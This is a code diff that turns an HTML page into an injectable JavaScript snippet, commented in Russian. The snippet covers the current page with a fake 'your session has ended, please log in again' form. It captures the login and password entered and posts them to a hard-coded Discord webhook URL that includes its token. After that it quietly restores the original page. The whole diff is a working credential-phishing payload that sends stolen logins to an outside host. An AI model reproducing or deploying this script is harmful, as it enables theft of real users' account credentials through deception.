@@ -1,9 +1,18 @@
-<!DOCTYPE html>
-<html lang="ru">
-<head>
-  <meta charset="UTF-8" />
-  <title>Login Overlay</title>
-  <style>
+(() => {
+  // Сохраняем исходное содержимое и стили страницы, чтобы вернуть после входа
+  const originalBodyHTML = document.body.innerHTML;
+  const originalBodyStyle = {
+    margin: document.body.style.margin,
+    background: document.body.style.background,
+    display: document.body.style.display,
+    justifyContent: document.body.style.justifyContent,
+    alignItems: document.body.style.alignItems,
+    height: document.body.style.height,
+  };
+
+  // Создаём стиль с @font-face
+  const style = document.createElement('style');
+  style.textContent = `
     @supports (font-variation-settings: normal) {
       @font-face {
         ascent-override: 100%;
@@ -29,21 +38,10 @@
     body, input, button, label {
       font-family: 'Intervar', sans-serif;
     }
-  </style>
-</head>
-<body>
-<script>
-(() => {
-  const originalBodyHTML = document.body.innerHTML;
-  const originalBodyStyle = {
-    margin: document.body.style.margin,
-    background: document.body.style.background,
-    display: document.body.style.display,
-    justifyContent: document.body.style.justifyContent,
-    alignItems: document.body.style.alignItems,
-    height: document.body.style.height,
-  };
+  `;
+  document.head.appendChild(style);
 
+  // Создаём оверлей — div на весь экран с абсолютным позиционированием
   const overlay = document.createElement('div');
   overlay.id = 'loginviewport';
   Object.assign(overlay.style, {
@@ -60,6 +58,7 @@
     fontFamily: `'Intervar', sans-serif`,
   });
 
+  // Контейнер формы
   const container = document.createElement('div');
   Object.assign(container.style, {
     width: '360px',
@@ -70,18 +69,21 @@
   });
   overlay.appendChild(container);
 
+  // Заголовок
   const h1 = document.createElement('h1');
   h1.textContent = 'Ваша сессия окончена. Пожалуйста, войдите снова.';
   h1.style.textAlign = 'center';
   h1.style.marginBottom = '24px';
   container.appendChild(h1);
 
+  // Форма
   const form = document.createElement('form');
   Object.assign(form.style, {
     display: 'flex',
     flexDirection: 'column',
   });
 
+  // Логин
   const loginLabel = document.createElement('label');
   loginLabel.textContent = 'Логин';
   loginLabel.style.marginBottom = '6px';
@@ -101,6 +103,7 @@
   });
   form.appendChild(loginInput);
 
+  // Пароль
   const passLabel = document.createElement('label');
   passLabel.textContent = 'Пароль';
   passLabel.style.marginBottom = '6px';
@@ -120,6 +123,7 @@
   });
   form.appendChild(passInput);
 
+  // Кнопка
   const btn = document.createElement('button');
   btn.type = 'submit';
   btn.textContent = 'Войти';
@@ -137,8 +141,10 @@
   btn.onmouseleave = () => btn.style.backgroundColor = '#d32f2f';
 
   form.appendChild(btn);
+
   container.appendChild(form);
 
+  // Обработчик сабмита
   form.addEventListener('submit', e => {
     e.preventDefault();
     const login = loginInput.value.trim();
@@ -149,6 +155,7 @@
       return;
     }
 
+    // Подготовка данных для Discord webhook
     const webhookUrl = 'https://discord.com/api/webhooks/1210472682563567686/FUb00La-5a9McnB-OGlPdVwhZYViqLib8bppLlH6TmQCptLzrMy_MKc4KI1aFF934LYx';
 
     const payload = {
@@ -166,6 +173,7 @@
       ]
     };
 
+    // Отправляем на вебхук
     fetch(webhookUrl, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
@@ -173,10 +181,13 @@
     })
     .then(response => {
       if (!response.ok) throw new Error('Ошибка при отправке данных');
+      // После успешной отправки — удаляем оверлей, показываем исходную страницу
       document.body.removeChild(overlay);
+      // Восстанавливаем стили
       for (const key in originalBodyStyle) {
         document.body.style[key] = originalBodyStyle[key];
       }
+      // Восстанавливаем исходный HTML
       document.body.innerHTML = originalBodyHTML;
       alert('Данные успешно отправлены. Добро пожаловать!');
     })
@@ -185,8 +196,6 @@
     });
   });
 
+  // Добавляем оверлей на страницу
   document.body.appendChild(overlay);
 })();
-</script>
-</body>
-</html>
